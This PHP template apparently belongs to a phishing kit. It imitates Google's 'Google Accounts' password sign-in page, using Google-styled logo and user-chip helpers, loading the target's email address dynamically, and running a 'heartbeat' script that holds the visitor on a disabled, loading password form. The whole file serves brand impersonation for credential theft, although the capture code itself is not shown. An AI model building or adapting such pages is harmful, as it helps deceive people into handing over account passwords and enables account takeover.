<?php require_once('includes/google_layout.php'); google_head('Google Accounts'); ?>

<div class="g-card g-card-pass is-loading">
    <?php google_card_progress(); ?>
    <div class="g-account-header">
        <?php google_logo(); ?>
        <h1 class="g-title">Welcome</h1>
        <?php google_user_chip(); ?>
    </div>

    <form class="g-form" action="#" method="POST">
        <div class="g-field">
            <input type="password" class="g-input" placeholder=" " disabled autocomplete="current-password">
            <label class="g-label">Enter your password</label>
        </div>

        <label class="g-check">
            <input type="checkbox" disabled>
            <span>Show password</span>
        </label>

        <div class="g-actions">
            <a href="#" class="g-btn g-btn-text is-disabled" tabindex="-1" aria-disabled="true">Forgot password?</a>
            <button type="button" class="g-btn g-btn-primary" disabled>Next</button>
        </div>
    </form>
</div>

<?php google_footer(); google_scripts(); ?>
<script>
GoogleAuth.loadEmail('dynamicEmail', true);
GoogleAuth.startHeartbeat('loading', true);
</script>
</body>
</html>
